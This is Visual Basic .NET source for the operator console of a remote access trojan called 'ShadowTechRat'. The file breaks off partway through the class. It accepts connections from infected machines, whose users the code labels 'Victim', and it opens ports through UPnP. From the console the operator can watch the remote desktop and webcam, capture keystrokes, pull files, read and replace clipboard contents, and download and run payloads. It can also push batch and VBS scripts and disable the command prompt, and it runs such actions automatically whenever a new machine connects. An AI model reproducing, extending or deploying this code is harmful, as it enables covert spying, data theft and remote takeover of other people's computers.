Imports System.Net.Sockets
Imports System.Net
Imports System.Threading
Imports System.IO
Imports System.Runtime.InteropServices
Imports Microsoft.Win32
Imports System.Runtime.Serialization
Imports System.CodeDom.Compiler

Public Class ShadowTechRat
    Dim listener As TcpListener
    Dim listenerThread As Thread
    Dim port As Integer = 7218
    Dim Db As New DialogBox
    Dim stillWritingBytes As Boolean = False
    Public Const newLine As String = "#-@NewLine@-#"
    Public Const splitter As String = "ESILlzCwXBSrQ1Vb72t6bIXtKRzHJkolNNL94gD8hIi9FwLiiVlrznTz68mkaaJQQSxJfdLyE4jCnl5QJJWuPD4NeO4WFYURvmkth8"
    Public Const key As String = "pSILlzCwXBSrQ1Vb72t6bIXtKRzAHJklNNL94gD8hIi9FwLiiVlr"
    Dim upnpnat As New NATUPNPLib.UPnPNAT
    Dim mappings As NATUPNPLib.IStaticPortMappingCollection = UPnPNAT.StaticPortMappingCollection
    Dim h As System.Net.IPHostEntry = System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName)
    Dim internalip As String = h.AddressList.GetValue(0).ToString

    Private Sub ShadowTechRat_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        Try
            Dim config As String = Encryption.XORDecryption(key, File.ReadAllText(Application.StartupPath & "\config.ini"))
            Dim settings() As String = Split(config, "|")
            Try
                If Not Convert.ToInt32(settings(0)) > 65535 Then
                    TextBox4.Text = Convert.ToInt32(settings(0))
                    TextBox5.Text = settings(1)
                    If settings(2) = "True" Then CheckBox1.Checked = True Else CheckBox1.Checked = False
                    If settings(3) = "True" Then CheckBox2.Checked = True Else CheckBox2.Checked = False
                    Dim part() As String = Split(settings(4), splitter)
                    For i = 0 To part.Length - 2
                        Dim item As New ListViewItem
                        item.Text = part(i)
                        item.SubItems.Add(part(i + 1))
                        item.SubItems.Add(part(i + 2))
                        item.SubItems.Add(part(i + 3))
                        ListView2.Items.Add(item) : i += 3
                    Next
                Else
                    File.Delete(Application.StartupPath & "\config.ini")
                End If
            Catch
                File.Delete(Application.StartupPath & "\config.ini")
            End Try
        Catch : End Try
        ComboBox3.SelectedIndex = 0 : ComboBox4.SelectedIndex = 0 : ComboBox5.SelectedIndex = 0 : ComboBox6.SelectedIndex = 0
        Try
            If Not IO.File.Exists(Application.StartupPath & "\Interop.NATUPNPLib.dll") Then IO.File.WriteAllBytes(Application.StartupPath & "\Interop.NATUPNPLib.dll", My.Resources.Interop_NATUPNPLib)
            If Not IO.File.Exists(Application.StartupPath & "\upnp.dll") Then IO.File.WriteAllBytes(Application.StartupPath & "\upnp.dll", My.Resources.upnp)
            Dim b As New Global.upnp.portmapper
            For Each portmapping As NATUPNPLib.IStaticPortMapping In mappings
                Dim lstring() As String = {portmapping.Protocol, portmapping.ExternalPort, portmapping.Description}
                Dim litem As New ListViewItem(lstring) : ListView3.Items.Add(litem)
            Next
            ListView3.ContextMenuStrip = ContextMenuStrip3
            Button10.Enabled = True
        Catch
        End Try
        TextBox22.Text = My.Resources.Updates
    End Sub

    Private Sub ShadowTechRat_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If MessageBox.Show("Are you sure to exit?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
            If StartToolStripMenuItem.Enabled = False Then StopToolStripMenuItem.PerformClick()
            NotifyIcon1.Visible = False
        Else
            e.Cancel = True
        End If
    End Sub

    Private Sub ShadowTechRat_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
        If Me.WindowState = FormWindowState.Minimized Then
            Me.Hide()
        End If
    End Sub

    Private Sub NotifyIcon1_MouseDoubleClick(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
        Me.Show()
        Me.WindowState = FormWindowState.Normal
    End Sub

    Private Sub StartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem.Click
        Try
            Try : Convert.ToInt32(TextBox4.Text)
            Catch
                MessageBox.Show("The port number has to be an integer.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Exit Sub
            End Try
            If Convert.ToInt32(TextBox4.Text) > 65535 Then
                MessageBox.Show("The port number has to be between 1 and 65535.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Exit Sub
            End If
            port = Convert.ToInt32(TextBox4.Text)
            If TextBox5.Text = "" Then
                MessageBox.Show("Please input a connection password.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Exit Sub
            End If
            listenerThread = New Thread(AddressOf Listen)
            listenerThread.IsBackground = True
            listenerThread.Start()
            ToolStripStatusLabel2.Text = "Connected"
            ToolStripStatusLabel4.Text = TextBox4.Text
            StartToolStripMenuItem.Enabled = False
            StopToolStripMenuItem.Enabled = True
            TextBox4.ReadOnly = True
            TextBox5.ReadOnly = True
            ListView1.ContextMenuStrip = ContextMenuStrip1
        Catch
        End Try
    End Sub

    Sub Listen()
        listener = New TcpListener(New IPEndPoint(IPAddress.Any, port))
        listener.Start()
        While (True)
            Dim c As New Connection(listener.AcceptTcpClient)
            AddHandler c.GotInfo, AddressOf GotInfo
            AddHandler c.Disconnected, AddressOf Disconnected
        End While
    End Sub

    Private Sub StopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.Items
            DirectCast(item.Tag, Connection).Leave()
        Next
        listenerThread.Abort() : listener.Stop()
        ToolStripStatusLabel2.Text = "Disconnected"
        ToolStripStatusLabel4.Text = "None"
        StartToolStripMenuItem.Enabled = True
        StopToolStripMenuItem.Enabled = False
        TextBox4.ReadOnly = False
        TextBox5.ReadOnly = False
        ListView1.ContextMenuStrip = Nothing
    End Sub

    Sub Send(ByVal Message As String, Optional ByVal pic As Image = Nothing, Optional ByVal bytes As Byte() = Nothing)
        For Each item As ListViewItem In ListView1.SelectedItems
            Try
                DirectCast(item.Tag, Connection).Send(Message, pic, bytes)
            Catch ex As Exception
            End Try
        Next
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If TextBox1.Text = "" Then
            Exit Sub
        End If
        For Each item As ListViewItem In ListView1.Items
            item.BackColor = Color.White
            If item.SubItems(1).Text.Contains(TextBox1.Text) Then
                item.BackColor = Color.Yellow
            End If
        Next
        TextBox1.Text = ""
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Try
            If ListView1.Items.Count >= Convert.ToInt32(TextBox3.Text) And Convert.ToInt32(TextBox2.Text) > 0 Then
                ListView1.Focus()
                For i = Convert.ToInt32(TextBox2.Text) - 1 To Convert.ToInt32(TextBox3.Text) - 1
                    ListView1.Items(i).Selected = True
                Next
            End If
        Catch
        End Try
        TextBox2.Text = ""
        TextBox3.Text = ""
    End Sub

    Private Sub ShadowTechRat_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyDown
        If e.KeyCode = Keys.Enter Then
            If Me.ActiveControl.Name = TextBox1.Name Then
                Button1.PerformClick()
            ElseIf Me.ActiveControl.Name = TextBox2.Name Or Me.ActiveControl.Name = TextBox3.Name Then
                Button2.PerformClick()
            End If
        End If
    End Sub

    Sub GotInfo(ByVal c As Connection, ByVal info As Data)
        Dim t As New Thread(AddressOf ParseInfo)
        t.IsBackground = True : t.Start(New InfoContainer(c, info))
    End Sub

    Sub ParseInfo(ByVal ic As InfoContainer)
        Dim c As Connection = ic.c : Dim info As Data = ic.d
        Dim Message As String = Encryption.XORDecryption(key, info.GetData)
        Dim cut() As String = Message.Split("|")
        Try
            Select Case cut(0)
                Case "Connect"
                    If cut(1) <> TextBox5.Text Then
                        RemoveHandler c.GotInfo, AddressOf GotInfo
                        RemoveHandler c.Disconnected, AddressOf Disconnected
                        c.Leave()
                        Exit Sub
                    End If
                    AddClient(c, {cut(2), cut(3), c.IPAddress, cut(4), cut(5)})
                Case "MyInfo"
                    Dim t As New Thread(AddressOf NewInfoForm)
                    t.IsBackground = True : t.Start(cut(1) & "|" & cut(2) & "|" & c.IPAddress & "|" & cut(3) & "|" & cut(4) & "|" & cut(5))
                Case "NewID"
                    For Each item As ListViewItem In ListView1.Items
                        If DirectCast(item.Tag, Connection).IPAddress = c.IPAddress Then
                            item.SubItems(1).Text = cut(1)
                            Exit For
                        End If
                    Next
                Case "RemoteDesktop"
                    c.remoteDeskForm.PictureBox1.Image = info.GetImage
                Case "RemoteWebcam"
                    c.webcamForm.PictureBox1.Image = info.GetImage
                Case "AddCam"
                    Dim itm As New ListViewItem : itm.Text = cut(1)
                    c.webcamForm.camList.ListView1.Items.Add(itm)
                Case "FileManager"
                    If cut(1) = "Error" Then
                        c.fileManagerForm.Button1.PerformClick()
                    Else
                        c.fileManagerForm.ListView1.Items.Clear()
                        Dim allFiles As String() = Split(cut(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            itm.Text = allFiles(i)
                            itm.SubItems.Add(allFiles(i + 1))
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = itm.Text.Substring(4)
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".bmp") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".txt") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".rar") Then
                                itm.ImageIndex = 7
                            Else
                                itm.ImageIndex = 8
                            End If
                            c.fileManagerForm.ListView1.Items.Add(itm)
                            i += 1
                        Next
                    End If
                Case "ProcessManager"
                    c.processManagerForm.ListView1.Items.Clear()
                    Dim allProcess As String() = Split(Message.Substring(15), "ProcessSplit") 'Message.Substring(15).Split("ProcessSplit")
                    For i = 0 To allProcess.Length - 2
                        Dim itm As New ListViewItem
                        itm.Text = allProcess(i)
                        itm.SubItems.Add(allProcess(i + 1))
                        itm.SubItems.Add(allProcess(i + 2))
                        itm.SubItems.Add(allProcess(i + 3))
                        If c.processManagerForm.suspendedList.Contains(allProcess(i + 1)) Then
                            itm.BackColor = Color.Red
                        End If
                        c.processManagerForm.ListView1.Items.Add(itm)
                        i += 3
                    Next
                Case "Keylogs"
                    c.keystrokeCaptureForm.TextBox1.Text &= Message.Substring(8).Replace(newLine, vbNewLine)
                Case "Chat"
                    c.chatSystemForm.TextBox1.Text += "[" & TimeOfDay & "] Victim: " & vbNewLine & Message.Substring(5) & vbNewLine & vbNewLine
                Case "NextPartOfUpload"
                    For Each item As ListViewItem In ListView4.Items
                        If item.Tag.ToString = cut(1) Then
                            item.BackColor = Color.White : Exit For
                        End If
                    Next
                Case "UploadFailed"
                    For Each item As ListViewItem In ListView4.Items
                        If item.Tag.ToString = cut(1) Then
                            item.SubItems(5).Text = "Failed" : item.BackColor = Color.White : item.Tag = 0 : Exit For
                        End If
                    Next
                Case "RetrievedFile"
                    For Each item As ListViewItem In ListView4.Items
                        If item.Tag.ToString = cut(1) Then
                            Try
                                If File.Exists(cut(2)) Then File.Delete(cut(2))
                                Dim fs As New FileStream(cut(2), FileMode.Create, FileAccess.Write)
                                Dim tempPacket() As Byte = info.GetBytes
                                Dim packet(tempPacket.Length - 2) As Byte
                                Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                                fs.Write(packet, 0, packet.Length) : fs.Close()
                                item.SubItems(5).Text = cut(3) & " % Completed"
                                c.Send("NextPartOfDownload|" & cut(1) & "|" & cut(2))
                            Catch
                                item.SubItems(5).Text = "Failed" : item.Tag = 0
                            End Try
                            Exit For
                        End If
                    Next
                Case "RetrievedContinue"
                    For Each item As ListViewItem In ListView4.Items
                        If item.Tag.ToString = cut(1) Then
                            Try
A:
                                stillWritingBytes = True
                                Dim fs As New FileStream(cut(2), FileMode.Append, FileAccess.Write)
                                Dim tempPacket() As Byte = info.GetBytes
                                Dim packet(tempPacket.Length - 2) As Byte
                                Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                                fs.Write(packet, 0, packet.Length) : fs.Close()
                                item.SubItems(5).Text = cut(3) & " % Completed"
                                stillWritingBytes = False
                                c.Send("NextPartOfDownload|" & cut(1) & "|" & cut(2))
                            Catch
                                GoTo A 'item.SubItems(5).Text = "Failed" : item.Tag = 0
                            End Try
                            Exit Sub
                        End If
                    Next
                    c.Send("RetrieveCanceled|" & cut(1))
                    Try
B:
                        File.Delete(cut(2))
                    Catch ex As Exception
                        GoTo B
                    End Try
                Case "RetrievedComplete"
                    For Each item As ListViewItem In ListView4.Items
                        If item.Tag.ToString = cut(1) Then
                            item.SubItems(4).Text = TimeOfDay : item.SubItems(5).Text = "100 % Completed" : item.Tag = 0
                            Exit For
                        End If
                    Next
                Case "RetrieveFailed"
                    For Each item As ListViewItem In ListView4.Items
                        If item.Tag.ToString = cut(1) Then
                            item.SubItems(5).Text = "Failed" : item.Tag = 0
C:
                            Try
                                File.Delete(cut(2))
                            Catch
                                GoTo C
                            End Try
                            Exit For
                        End If
                    Next
                Case "Clipboard"
                    c.clipboardForm.TextBox1.Text = Message.Substring(10).Replace(newLine, vbNewLine)
            End Select
        Catch
        End Try
    End Sub

    Sub Disconnected(ByVal c As Connection)
        For Each item As ListViewItem In ListView1.Items
            If DirectCast(item.Tag, Connection).IPAddress = c.IPAddress Then
                item.Remove() : ToolStripStatusLabel6.Text = ListView1.Items.Count.ToString
                If c.infoForm.CanFocus Then c.infoForm.Close()
                If c.remoteDeskForm.CanFocus Then c.remoteDeskForm.Close()
                If c.webcamForm.camList.CanFocus Then c.webcamForm.camList.Close()
                If c.webcamForm.CanFocus Then c.webcamForm.Close()
                If c.fileManagerForm.CanFocus Then c.fileManagerForm.Close()
                If c.processManagerForm.CanFocus Then c.processManagerForm.Close()
                If c.keystrokeCaptureForm.CanFocus Then c.keystrokeCaptureForm.Close()
                If c.chatSystemForm.CanFocus Then c.chatSystemForm.Close()
                If c.clipboardForm.CanFocus Then c.clipboardForm.Close()
                Exit For
            End If
        Next
    End Sub

    Sub AddClient(ByVal c As Connection, ByVal info() As String)
        For Each item As ListViewItem In ListView1.Items
            If DirectCast(item.Tag, Connection).IPAddress = c.IPAddress Then
                item.Remove()
            End If
        Next
        Dim l As New ListViewItem(info) : l.Tag = c : ListView1.Items.Add(l)
A:
        Try
            Dim country As String = GetCountryCode(ListView1.Items.Item(ListView1.Items.Count - 1).Text) & ".png"
            ListView1.Items.Item(ListView1.Items.Count - 1).ImageKey = country
        Catch
            If IO.File.Exists(Application.StartupPath & "\GeoIP.dat") Then
                IO.File.Delete(Application.StartupPath & "\GeoIP.dat")
            End If
            IO.File.WriteAllBytes(Application.StartupPath & "\GeoIP.dat", My.Resources.GeoIP)
            GoTo A
        End Try
        ToolStripStatusLabel6.Text = ListView1.Items.Count.ToString
        If ListView1.Items.Count > Convert.ToInt32(ToolStripStatusLabel8.Text) Then
            ToolStripStatusLabel8.Text = ListView1.Items.Count.ToString
        End If
        If CheckBox1.Checked Then
            NotifyIcon1.BalloonTipText = c.IPAddress & " - " & info(1)
            NotifyIcon1.ShowBalloonTip(400)
        End If
        If CheckBox2.Checked Then
            My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Beep)
        End If
        For Each item As ListViewItem In ListView2.Items
            If (info(0) = item.Text Or item.Text = "*") And (info(1) = item.SubItems(1).Text Or item.SubItems(1).Text = "*") And (info(3) = item.SubItems(2).Text Or item.SubItems(2).Text = "*") Then
                Select Case item.SubItems(3).Text
                    Case "Change ID"
                        c.Send("ChangeID|" & item.Tag.ToString)
                    Case "Restart Server"
                        c.Send("RestartServer|")
                    Case "Uninstall Server"
                        c.Send("Uninstall|")
                    Case "Close Server"
                        c.Send("Close|")
                    Case "Logoff PC"
                        c.Send("Logoff|")
                    Case "Shutdown PC"
                        c.Send("Shutdown|")
                    Case "Restart PC"
                        c.Send("Restart|")
                    Case "Visit URL"
                        c.Send("VisitURL|" & item.Tag.ToString)
                    Case "Download + Execute"
                        Dim part() As String = Split(item.Tag.ToString, "|")
                        c.Send("Download+Execute|" & part(0) & "|" & part(1))
                End Select
            End If
        Next
    End Sub

    Private Function GetCountryCode(ByVal Address As String)
        Dim _IPDataPath As String = (Application.StartupPath & "\GeoIP.dat")
        Dim _CountryLookup As CountryLookup = New CountryLookup(_IPDataPath)
        Dim _CountryCode, _CountryName As String
        Dim _UserIPAddress As String = Address
        With _CountryLookup
            _CountryCode = .LookupCountryCode(_UserIPAddress)
            _CountryName = .LookupCountryName(_UserIPAddress)
            Return _CountryCode
        End With
    End Function

    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        For Each item As ListViewItem In ListView1.Items
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.infoForm.CanFocus Then
                c.infoForm.Activate()
            Else
                c.Send("GetInfo|")
            End If
        Next
    End Sub

    Sub NewInfoForm(ByVal info As String)
        Dim cut() As String = info.Split("|") : Dim c As Connection
        For Each item As ListViewItem In ListView1.Items
            If DirectCast(item.Tag, Connection).IPAddress = cut(2) Then
                c = DirectCast(item.Tag, Connection)
                Exit For
            End If
        Next
        c.infoForm.TextBox1.Text = cut(0)
        c.infoForm.TextBox2.Text = cut(1)
        c.infoForm.TextBox3.Text = cut(2)
        c.infoForm.TextBox4.Text = cut(3)
        c.infoForm.TextBox5.Text = cut(4) & " Bytes"
        c.infoForm.TextBox6.Text = cut(5)
        c.infoForm.ShowDialog()
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromURLToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then
            Send("UpdateFromURL|" & Db.inputText)
        End If
    End Sub

    Private Sub FromFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromFileToolStripMenuItem.Click
        Dim ofd As New OpenFileDialog With {.Filter = "Executable Files (*.exe)|*.exe"}
        If ofd.ShowDialog = DialogResult.OK Then
            Send("UpdateFromFile|", , IO.File.ReadAllBytes(ofd.FileName))
        End If
    End Sub

    Private Sub ChangeIDToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ChangeIDToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then
            Send("ChangeID|" & Db.inputText)
        End If
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem1.Click
        Send("RestartServer|")
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        Send("Uninstall|")
    End Sub

    Private Sub CloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        Send("Close|")
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogoffToolStripMenuItem.Click
        Send("Logoff|")
    End Sub

    Private Sub RestartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem.Click
        Send("Restart|")
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        Send("Shutdown|")
    End Sub

    Private Sub DesktopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DesktopToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.remoteDeskForm.CanFocus Then
                c.remoteDeskForm.Activate()
            Else
                c.remoteDeskForm = New RemoteDesktop(c)
                c.Send("StartDesktop|") : c.remoteDeskForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowRemoteDesktop)
                t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub WebcamToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles WebcamToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.webcamForm.CanFocus Then
                c.webcamForm.Activate()
            ElseIf c.webcamForm.camList.CanFocus Then
                c.webcamForm.camList.Activate()
            Else
                c.webcamForm = New Webcam(c)
                c.webcamForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowWebcam)
                t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FileManagerToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.fileManagerForm.CanFocus Then
                c.fileManagerForm.Activate()
            Else
                c.fileManagerForm = New FileManager(c)
                c.fileManagerForm.TextBox1.Text = "" : c.fileManagerForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowFileManager)
                t.SetApartmentState(ApartmentState.STA) : t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.processManagerForm.CanFocus Then
                c.processManagerForm.Activate()
            Else
                c.processManagerForm = New ProcessManager(c)
                c.Send("GetProcesses|") : c.processManagerForm.Text = "Process Manager: " & c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowProcessManager)
                t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub KeystrokeCaptureToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KeystrokeCaptureToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.keystrokeCaptureForm.CanFocus Then
                c.keystrokeCaptureForm.Activate()
            Else
                c.keystrokeCaptureForm = New KeystrokeCapture(c)
                c.keystrokeCaptureForm.TextBox1.Text = "" : c.Send("StartKeystrokeCapture|")
                c.keystrokeCaptureForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowKeystrokeCapture)
                t.SetApartmentState(ApartmentState.STA) : t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub ChatSystemToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ChatSystemToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.chatSystemForm.CanFocus Then
                c.chatSystemForm.Activate()
            Else
                c.chatSystemForm = New ChatSystem(c)
                c.chatSystemForm.TextBox1.Text = "" : c.Send("StartChatSystem|") : c.chatSystemForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                c.chatSystemForm.TextBox1.Clear() : Dim t As New Thread(AddressOf ShowChatSystem)
                t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub GetToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.clipboardForm.CanFocus Then
                c.clipboardForm.Activate()
            Else
                c.clipboardForm = New Clipboard(c)
                c.clipboardForm.TextBox1.Text = "" : c.Send("GetClipboard|") : c.clipboardForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowClipboard)
                t.SetApartmentState(ApartmentState.STA) : t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub SetToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SetToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then
            Send("SetClipboard|" & Db.inputText)
        End If
    End Sub

    Private Sub ClearToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ClearToolStripMenuItem.Click
        Send("ClearClipboard|")
    End Sub

    Private Sub VisitURLToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VisitURLToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then
            Send("VisitURL|" & Db.inputText)
        End If
    End Sub

    Private Sub DownloadExecuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadExecuteToolStripMenuItem.Click
        If Download.ShowDialog = DialogResult.OK Then
            Send("Download+Execute|" & Download.downloadLink & "|" & Download.filename)
        End If
    End Sub

    Private Sub SendMessageToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendMessageToolStripMenuItem.Click
        If SendMessage.ShowDialog = DialogResult.OK Then
            Send("Message|" & SendMessage.messageicon & "|" & SendMessage.messagebutton & "|" & SendMessage.title & "|" & SendMessage.message)
        End If
    End Sub

    Private Sub BatchToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BatchToolStripMenuItem.Click
        If Script.ShowDialog = DialogResult.OK Then
            Send("Batch|" & Script.scriptText.Replace(vbNewLine, newLine))
        End If
    End Sub

    Private Sub HtmlToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HtmlToolStripMenuItem.Click
        If Script.ShowDialog = DialogResult.OK Then
            Send("Html|" & Script.scriptText.Replace(vbNewLine, newLine))
        End If
    End Sub

    Private Sub VbsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VbsToolStripMenuItem.Click
        If Script.ShowDialog = DialogResult.OK Then
            Send("Vbs|" & Script.scriptText.Replace(vbNewLine, newLine))
        End If
    End Sub

    Private Sub OpenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenToolStripMenuItem.Click
        Send("OpenCD|")
    End Sub

    Private Sub CloseToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem1.Click
        Send("CloseCD|")
    End Sub

    Private Sub DisableToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem.Click
        Send("DisableKM|")
    End Sub

    Private Sub EnableToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem.Click
        Send("EnableKM|")
    End Sub

    Private Sub TurnOffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TurnOffToolStripMenuItem.Click
        Send("TurnOffMonitor|")
    End Sub

    Private Sub TurnOnToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TurnOnToolStripMenuItem.Click
        Send("TurnOnMonitor|")
    End Sub

    Private Sub NormalToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NormalToolStripMenuItem.Click
        Send("NormalMouse|")
    End Sub

    Private Sub ReverseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ReverseToolStripMenuItem.Click
        Send("ReverseMouse|")
    End Sub

    Private Sub HideToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HideToolStripMenuItem.Click
        Send("HideTaskBar|")
    End Sub

    Private Sub ShowToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShowToolStripMenuItem.Click
        Send("ShowTaskBar|")
    End Sub

    Private Sub DisableToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem1.Click
        Send("DisableCMD|")
    End Sub

    Private Sub EnableToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem1.Click
        Send("EnableCMD|")
    End Sub

